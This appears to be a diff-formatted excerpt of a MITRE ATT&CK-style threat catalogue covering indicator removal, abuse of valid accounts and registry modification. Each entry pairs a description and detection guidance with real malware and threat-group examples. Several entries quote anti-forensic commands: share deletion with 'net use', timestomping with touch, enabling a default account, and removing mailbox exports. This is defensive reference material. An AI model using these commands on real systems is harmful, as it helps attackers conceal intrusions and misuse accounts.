+- [S1034] StrifeWater: StrifeWater can self delete to cover its tracks.
+- [S1133] Apostle: Apostle writes batch scripts to disk, such as system.bat and remover.bat, that perform various anti-analysis and anti-forensic tasks, before finally deleting themselves at the end of execution. Apostle attempts to delete itself after encryption or wiping operations are complete and before shutting down the victim machine.
+- [S0587] Penquin: Penquin can delete downloaded executables after running them.
+- [S0499] Hancitor: Hancitor has deleted files using the VBA kill function.
+- [S0161] XAgentOSX: XAgentOSX contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.
+- [S0263] TYPEFRAME: TYPEFRAME can delete files off the system.
+- [S1018] Saint Bot: Saint Bot can run a batch script named `del.bat` to remove any Saint Bot payload-linked files from a compromise system if anti-analysis or locale checks fail.
+- [S1016] MacMa: MacMa can delete itself from the compromised computer.
+- [S0461] SDBbot: SDBbot has the ability to delete files from a compromised host.
+- [S0180] Volgmer: Volgmer can delete files and itself after infection to avoid analysis.
+- [S0267] FELIXROOT: FELIXROOT deletes the .LNK file from the startup directory as well as the dropper components.
+- [S1044] FunnyDream: FunnyDream can delete files including its dropper component.
+- [S0583] Pysa: Pysa has deleted batch files after execution.
+- [S0148] RTM: RTM can delete all files created during its execution.
+- [S0650] QakBot: QakBot can delete folders and files including overwriting its executable with legitimate programs.
+
+### T1070.005 - Indicator Removal: Network Share Connection Removal
+
+Description:
+
+Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the net use \\system\share /delete command.
+
+Detection:
+
+Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of net use commands associated with establishing and removing remote shares over SMB, including following best practices for detection of Windows Admin Shares. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.
+
+Procedures:
+
+- [S0039] Net: The net use \\system\share /delete command can be used in Net to remove an established connection to a network share.
+- [S0400] RobbinHood: RobbinHood disconnects all network shares from the computer with the command net use * /DELETE /Y.
+- [S1159] DUSTTRAP: DUSTTRAP can remove network shares from infected systems.
+- [S0260] InvisiMole: InvisiMole can disconnect previously connected remote drives.
+- [G0027] Threat Group-3390: Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection.
+
+### T1070.006 - Indicator Removal: Timestomp
+
+Description:
+
+Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files. In Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file. `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel. Modifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file. Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in “double timestomping” by modifying times on both attributes simultaneously. In Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as `touch -a -m -t ` (which sets access and modification times to a specific value) or `touch -r ` (which sets access and modification times to match those of another file). Timestomping may be used along with file name Masquerading to hide malware and tools.
+
+Detection:
+
+Forensic techniques exist to detect aspects of files that have had their timestamps modified. It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.
+
+Procedures:
+
+- [S0586] TAINTEDSCRIBE: TAINTEDSCRIBE can change the timestamp of specified filenames.
+- [G0007] APT28: APT28 has performed timestomping on victim files.
+- [S0687] Cyclops Blink: Cyclops Blink has the ability to use the Linux API function `utime` to change the timestamps of modified firmware update images.
+- [G1023] APT5: APT5 has modified file timestamps.
+- [S0168] Gazer: For early Gazer versions, the compilation timestamp was faked.
+- [S0603] Stuxnet: Stuxnet extracts and writes driver files that match the times of other legitimate files.
+- [S0239] Bankshot: Bankshot modifies the time of a file as specified by the control server.
+- [S0181] FALLCHILL: FALLCHILL can modify file or directory timestamps.
+- [S1181] BlackByte 2.0 Ransomware: BlackByte 2.0 Ransomware can timestomp files for defense evasion and anti-forensics purposes.
+- [S0072] OwaAuth: OwaAuth has a command to timestop a file or directory.
+- [C0029] Cutting Edge: During Cutting Edge, threat actors changed timestamps of multiple files on compromised Ivanti Secure Connect VPNs to conceal malicious activity.
+- [S1090] NightClub: NightClub can modify the Creation, Access, and Write timestamps for malicious DLLs to match those of the genuine Windows DLL user32.dll.
+- [S0136] USBStealer: USBStealer sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.
+- [S0570] BitPaymer: BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.
+- [S0021] Derusbi: The Derusbi malware supports timestomping.
+- [S0154] Cobalt Strike: Cobalt Strike can timestomp any files or payloads placed on a target machine to help them blend in.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D can use the touch -t command to change timestamps.
+- [S0393] PowerStallion: PowerStallion modifies the MAC times of its local log files to match that of the victim's desktop.ini file.
+- [S0185] SEASHARPEE: SEASHARPEE can timestomp files on victims using a Web shell.
+- [S0081] Elise: Elise performs timestomping of a CAB file it creates.
+- [G0082] APT38: APT38 has modified data timestamps to mimic files that are in the same folder on a compromised host.
+- [G0050] APT32: APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally, APT32 has used a random value to modify the timestamp of the file storing the clientID.
+- [G0094] Kimsuky: Kimsuky has manipulated timestamps for creation or compilation dates to defeat anti-forensics.
+- [S0387] KeyBoy: KeyBoy time-stomped its DLL in order to evade detection.
+- [S0568] EVILNUM: EVILNUM has changed the creation date of files.
+- [S0520] BLINDINGCAN: BLINDINGCAN has modified file and directory timestamps.
+- [S1016] MacMa: MacMa has the capability to create and modify file timestamps.
+- [S1161] BPFDoor: BPFDoor uses the `utimes()` function to change the executable's timestamp.
+- [S0641] Kobalos: Kobalos can modify timestamps of replaced files, such as ssh with the added credential stealer or sshd used to deploy Kobalos.
+- [S1031] PingPull: PingPull has the ability to timestomp a file.
+- [G0016] APT29: APT29 has used timestomping to alter the Standard Information timestamps on their web shells to match other files in the same directory.
+- [S0438] Attor: Attor has manipulated the time of last access to files and registry keys after they have been created or modified.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 modified timestamps of backdoors to match legitimate Windows files.
+- [S0020] China Chopper: China Chopper's server component can change the timestamp of files.
+- [S1164] UPSTYLE: UPSTYLE restores timestamps to original values following modification.
+- [S0260] InvisiMole: InvisiMole samples were timestomped by the authors by setting the PE timestamps to all zero values. InvisiMole also has a built-in command to modify file times.
+- [S0666] Gelsemium: Gelsemium has the ability to perform timestomping of files on targeted systems.
+- [S0141] Winnti for Windows: Winnti for Windows can set the timestamps for its worker and service components to match that of cmd.exe.
+- [C0032] C0032: During the C0032 campaign, TEMP.Veles used timestomping to modify the $STANDARD_INFORMATION attribute on tools.
+- [G0114] Chimera: Chimera has used a Windows version of the Linux touch command to modify the date and time stamp on DLLs.
+- [S0164] TDTESS: After creating a new service for persistence, TDTESS sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.
+- [G0032] Lazarus Group: Several Lazarus Group malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.
+- [S0066] 3PARA RAT: 3PARA RAT has a command to set certain attributes such as creation/modification timestamps on files.
+- [S0150] POSHSPY: POSHSPY modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.
+- [S0078] Psylo: Psylo has a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.
+- [S1135] MultiLayer Wiper: MultiLayer Wiper changes timestamps of overwritten files to either 1601.1.1 for NTFS filesystems, or 1980.1.1 for all other filesystems.
+- [S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can time stomp its executable, previously dating it between 2010 to 2021.
+- [S1100] Ninja: Ninja can change or create the last access or write times.
+- [S0083] Misdat: Many Misdat samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.
+- [S0140] Shamoon: Shamoon can change the modified time for files to evade forensic detection.
+- [S1059] metaMain: metaMain can change the `CreationTime`, `LastAccessTime`, and `LastWriteTime` file time attributes when executed with `SYSTEM` privileges.
+- [S0363] Empire: Empire can timestomp any files or payloads placed on a target machine to help them blend in.
+- [G0106] Rocke: Rocke has changed the time stamp of certain files.
+
+### T1070.007 - Indicator Removal: Clear Network Connection History and Configurations
+
+Description:
+
+Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries. Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under : * HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default * HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers Windows may also store information about recent RDP connections in files such as C:\Users\\%username%\Documents\Default.rdp and `C:\Users\%username%\AppData\Local\Microsoft\Terminal Server Client\Cache\`. Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`). Malicious network connections may also require changes to third-party applications or network configuration settings, such as Disable or Modify System Firewall or tampering to enable Proxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.
+
+Procedures:
+
+- [S0559] SUNBURST: SUNBURST also removed the firewall rules it created during execution.
+- [G1017] Volt Typhoon: Volt Typhoon has inspected server logs to remove their IPs.
+
+### T1070.008 - Indicator Removal: Clear Mailbox Data
+
+Description:
+
+Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing/Internal Spearphishing, Email Collection, Mail Protocols for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used the ExchangePowerShell PowerShell module, including Remove-MailboxExportRequest to remove evidence of mailbox exports. On Linux and macOS, adversaries may also delete emails through a command line utility called mail or use AppleScript to interact with APIs on macOS. Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.
+
+Procedures:
+
+- [S1142] LunarMail: LunarMail can set the `PR_DELETE_AFTER_SUBMIT` flag to delete messages sent for data exfiltration.
+- [G1044] APT42: APT42 has deleted login notification emails and has cleared the Sent folder to cover their tracks.
+- [S0477] Goopy: Goopy has the ability to delete emails used for C2 once the content has been copied.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 removed evidence of email export requests using `Remove-MailboxExportRequest`.
+
+### T1070.009 - Indicator Removal: Clear Persistence
+
+Description:
+
+Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. Adversaries may also delete accounts previously created to maintain persistence (i.e. Create Account). In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.
+
+Procedures:
+
+- [S0559] SUNBURST: SUNBURST removed IFEO registry values to clean up traces of persistence.
+- [S0500] MCMD: MCMD has the ability to remove set Registry Keys, including those used for persistence.
+- [S0534] Bazar: Bazar's loader can delete scheduled tasks created by a previous instance of the malware.
+- [S1132] IPsec Helper: IPsec Helper can delete various service traces related to persistent execution when commanded.
+- [S0517] Pillowmint: Pillowmint can uninstall the malicious service from an infected machine.
+- [S0083] Misdat: Misdat is capable of deleting Registry keys used for persistence.
+- [S1190] Kapeka: Kapeka will clear registry values used for persistent configuration storage when uninstalled.
+- [S0085] S-Type: S-Type has deleted accounts it has created.
+- [S0385] njRAT: njRAT is capable of manipulating and deleting registry keys, including those used for persistence.
+- [S0669] KOCTOPUS: KOCTOPUS can delete created registry keys used for persistence as part of its cleanup procedure.
+- [S0632] GrimAgent: GrimAgent can delete previously created tasks on a compromised host.
+- [S1130] Raspberry Robin: Raspberry Robin uses a RunOnce Registry key for persistence, where the key is removed after its use on reboot then re-added by the malware after it resumes execution.
+- [S0148] RTM: RTM has the ability to remove Registry entries that it created for persistence.
+
+### T1070.010 - Indicator Removal: Relocate Malware
+
+Description:
+
+Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with File Deletion to cleanup older artifacts. Relocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., Match Legitimate Resource Name or Location). Payloads may also be repositioned to target File/Path Exclusions as well as specific locations associated with establishing Persistence. Relocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as User Execution and Phishing) that may have generated alerts or otherwise drawn attention from defenders.
+
+
+### T1078.001 - Valid Accounts: Default Accounts
+
+Description:
+
+Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes. Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services. Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via Exploitation for Credential Access on the vCenter host), they will then have access to the ESXi server.
+
+Detection:
+
+Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.
+
+Procedures:
+
+- [G1016] FIN13: FIN13 has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access.
+- [S0537] HyperStack: HyperStack can use default credentials to connect to IPC$ shares on remote machines.
+- [C0038] HomeLand Justice: During HomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP and Impacket.
+- [G0059] Magic Hound: Magic Hound enabled and used the default system managed account, DefaultAccount, via `"powershell.exe" /c net user DefaultAccount /active:yes` to connect to a targeted Exchange server over RDP.
+- [S0603] Stuxnet: Stuxnet infected WinCC machines via a hardcoded database server password.
+- [G1003] Ember Bear: Ember Bear has abused default user names and passwords in externally-accessible IP cameras for initial access.
+
+### T1078.002 - Valid Accounts: Domain Accounts
+
+Description:
+
+Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services. Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.
+
+Detection:
+
+Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access). On Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd). Perform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.
+
+Procedures:
+
+- [S1024] CreepySnail: CreepySnail can use stolen credentials to authenticate on target networks.
+- [C0002] Night Dragon: During Night Dragon, threat actors used domain accounts to gain further access to victim systems.
+- [C0023] Operation Ghost: For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks.
+- [C0048] Operation MidnightEclipse: During Operation MidnightEclipse, threat actors used a compromised domain admin account to move laterally.
+- [S0154] Cobalt Strike: Cobalt Strike can use known credentials to run commands and spawn processes as a domain user account.
+- [G0019] Naikon: Naikon has used administrator credentials for lateral movement in compromised networks.
+- [C0049] Leviathan Australian Intrusions: Leviathan compromised domain credentials during Leviathan Australian Intrusions.
+- [C0012] Operation CuckooBees: During Operation CuckooBees, the threat actors used compromised domain administrator credentials as part of their lateral movement.
+- [G1030] Agrius: Agrius attempted to acquire valid credentials for victim environments through various means to enable follow-on lateral movement.
+- [G0102] Wizard Spider: Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network.
+- [G0034] Sandworm Team: Sandworm Team has used stolen credentials to access administrative accounts within the domain.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks.
+- [S0446] Ryuk: Ryuk can use stolen domain admin accounts to move laterally within a victim domain.
+- [G0049] OilRig: OilRig has used an exfiltration tool named STEALHOOK to retreive valid domain credentials.
+- [S0140] Shamoon: If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.
+- [G1021] Cinnamon Tempest: Cinnamon Tempest has obtained highly privileged credentials such as domain administrator in order to deploy malware.
+- [G1022] ToddyCat: ToddyCat has used compromised domain admin credentials to mount local network shares.
+- [G0119] Indrik Spider: Indrik Spider has collected credentials from infected systems, including domain accounts.
+- [G0022] APT3: APT3 leverages valid accounts after gaining credentials for use within the victim domain.
+- [G0114] Chimera: Chimera has used compromised domain accounts to gain access to the target environment.
+- [C0014] Operation Wocao: During Operation Wocao, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation.
+- [G1040] Play: Play has used valid domain accounts for access.
+- [G0092] TA505: TA505 has used stolen domain admin accounts to compromise additional hosts.
+- [G0028] Threat Group-1314: Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally.
+- [G1023] APT5: APT5 has used legitimate account credentials to move laterally through compromised environments.
+- [G0059] Magic Hound: Magic Hound has used domain administrator accounts after dumping LSASS process memory.
+- [C0029] Cutting Edge: During Cutting Edge, threat actors used compromised VPN accounts for lateral movement on targeted networks.
+- [S0603] Stuxnet: Stuxnet attempts to access network resources with a domain account’s credentials.
+- [G1017] Volt Typhoon: Volt Typhoon has used compromised domain accounts to authenticate to devices on compromised networks.
+- [G1043] BlackByte: BlackByte captured credentials for or impersonated domain administration users.
+- [G0143] Aquatic Panda: Aquatic Panda used multiple mechanisms to capture valid user accounts for victim domains to enable lateral movement and access to additional hosts in victim environments.
+
+### T1078.003 - Valid Accounts: Local Accounts
+
+Description:
+
+Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. Local Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.
+
+Detection:
+
+Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.
+
+Procedures:
+
+- [G0094] Kimsuky: Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.
+- [S0367] Emotet: Emotet can brute force a local admin password, then use it to facilitate lateral movement.
+- [S0154] Cobalt Strike: Cobalt Strike can use known credentials to run commands and spawn processes as a local user account.
+- [G0056] PROMETHIUM: PROMETHIUM has created admin accounts on a compromised host.
+- [G0051] FIN10: FIN10 has moved laterally using the Local Administrator account.
+- [G1040] Play: Play has used valid local accounts to gain initial access.
+- [G0050] APT32: APT32 has used legitimate local admin account credentials.
+- [G1041] Sea Turtle: Sea Turtle compromised cPanel accounts in victim environments.
+- [G0081] Tropic Trooper: Tropic Trooper has used known administrator account credentials to execute the backdoor directly.
+- [G0125] HAFNIUM: HAFNIUM has used the NT AUTHORITY\SYSTEM account to create files on Exchange servers.
+- [G0046] FIN7: FIN7 has used compromised credentials for access as SYSTEM on Exchange servers.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks.
+- [C0049] Leviathan Australian Intrusions: Leviathan used captured local account information, such as service accounts, for actions during Leviathan Australian Intrusions.
+- [G1047] Velvet Ant: Velvet Ant accessed vulnerable Cisco switch devices using accounts with administrator privileges.
+- [G0016] APT29: APT29 targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence.
+- [S0368] NotPetya: NotPetya can use valid credentials with PsExec or wmic to spread itself to remote systems.
+- [S1202] LockBit 3.0: LockBit 3.0 can use a compromised local account for lateral movement.
+- [S0221] Umbreon: Umbreon creates valid local users to provide access to the system.
+- [C0014] Operation Wocao: During Operation Wocao, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation.
+- [G0010] Turla: Turla has abused local accounts that have the same password across the victim’s network.
+
+### T1078.004 - Valid Accounts: Cloud Accounts
+
+Description:
+
+Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. Service or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices. An adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. Cloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to Steal Application Access Tokens to move laterally across the cloud environment.
+
+Detection:
+
+Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.
+
+Procedures:
+
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal.
+- [G0016] APT29: APT29 has gained access to a global administrator account in Azure AD and has used `Service Principal` credentials in Exchange.
+- [G1023] APT5: APT5 has accessed Microsoft M365 cloud environments using stolen credentials.
+- [S0684] ROADTools: ROADTools leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API.
+- [G0007] APT28: APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.
+- [C0027] C0027: During C0027, Scattered Spider leveraged compromised credentials from victim users to authenticate to Azure tenants.
+- [S0683] Peirates: Peirates can use stolen service account tokens to perform its operations.
+- [G0125] HAFNIUM: HAFNIUM has abused service principals in compromised environments to enable data exfiltration.
+- [S1091] Pacu: Pacu leverages valid cloud accounts to perform most of its operations.
+- [G0064] APT33: APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints.
+- [G1004] LAPSUS$: LAPSUS$ has used compromised credentials to access cloud assets within a target organization.
+- [G0004] Ke3chang: Ke3chang has used compromised credentials to sign into victims’ Microsoft 365 accounts.
+
+
+### T1112 - Modify Registry
+
+Description:
+
+Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution. Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API. The Registry may be modified in order to hide configuration information or malicious payloads via Obfuscated Files or Information. The Registry may also be modified to Impair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory. The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication. Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.
+
+Detection:
+
+Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file. Monitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis. Monitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns and RegDelNull .
+
+Procedures:
+
+- [S0674] CharmPower: CharmPower can remove persistence-related artifacts from the Registry.
+- [C0028] 2015 Ukraine Electric Power Attack: During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching `rundll32.exe`, which in-turn launches the malware and communicates with C2 servers over the Internet. .
+- [G0010] Turla: Turla has modified Registry values to store payloads.
+- [S0013] PlugX: PlugX has a module to create, delete, or modify Registry keys.
+- [S0596] ShadowPad: ShadowPad can modify the Registry to store and maintain a configuration block and virtual file system.
+- [S0457] Netwalker: Netwalker can add the following registry entry: HKEY_CURRENT_USER\SOFTWARE\{8 random characters}.
+- [S0476] Valak: Valak has the ability to modify the Registry key HKCU\Software\ApplicationContainer\Appsw64 to store information regarding the C2 server and downloads.
+- [S0240] ROKRAT: ROKRAT can modify the `HKEY_CURRENT_USER\Software\Microsoft\Office\` registry key so it can bypass the VB object model (VBOM) on a compromised host.
+- [G0082] APT38: APT38 uses a tool called CLEANTOAD that has the capability to modify Registry keys.
+- [S0376] HOPLIGHT: HOPLIGHT has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.
+- [S0261] Catchamas: Catchamas creates three Registry keys to establish persistence by adding a Windows Service.
+- [S0032] gh0st RAT: gh0st RAT has altered the InstallTime subkey.
+- [S0242] SynAck: SynAck can manipulate Registry keys.
+- [S0533] SLOTHFULMEDIA: SLOTHFULMEDIA can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap registry.
+- [S0608] Conficker: Conficker adds keys to the Registry at HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services and various other Registry locations.
+- [S1033] DCSrv: DCSrv has created Registry keys for persistence.
+- [S0559] SUNBURST: SUNBURST had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their HKLM\SYSTEM\CurrentControlSet\services\\[service_name]\\Start registry entries to value 4. It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.
+- [G0040] Patchwork: A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.
+- [S0569] Explosive: Explosive has a function to write itself to Registry values.
+- [S0518] PolyglotDuke: PolyglotDuke can write encrypted JSON configuration files to the Registry.
+- [S0012] PoisonIvy: PoisonIvy creates a Registry subkey that registers a new system device.
+- [S0669] KOCTOPUS: KOCTOPUS has added and deleted keys from the Registry.
+- [S1202] LockBit 3.0: LockBit 3.0 can change the Registry values for Group Policy refresh time, to disable SmartScreen, and to disable Windows Defender.
+- [G0119] Indrik Spider: Indrik Spider has modified registry keys to prepare for ransomware execution and to disable common administrative utilities.
+- [S0397] LoJax: LoJax has modified the Registry key ‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’ from ‘autocheck autochk *’ to ‘autocheck autoche *’.
+- [S0158] PHOREAL: PHOREAL is capable of manipulating the Registry.
+- [S0428] PoetRAT: PoetRAT has made registry modifications to alter its behavior upon execution.
+- [S0496] REvil: REvil can modify the Registry to save encryption parameters and system information.
+- [S0031] BACKSPACE: BACKSPACE is capable of deleting Registry keys, sub-keys, and values on a victim system.
+- [S0673] DarkWatchman: DarkWatchman can modify Registry values to store configuration strings, keylogger, and output of components.
+- [S0531] Grandoreiro: Grandoreiro can modify the Registry to store its configuration at `HKCU\Software\` under frequently changing names including %USERNAME% and ToolTech-RM.
+- [S0011] Taidoor: Taidoor has the ability to modify the Registry on compromised hosts using RegDeleteValueA and RegCreateKeyExA.
+- [S0603] Stuxnet: Stuxnet can create registry keys to load driver files.
+- [S0668] TinyTurla: TinyTurla can set its configuration parameters in the Registry.
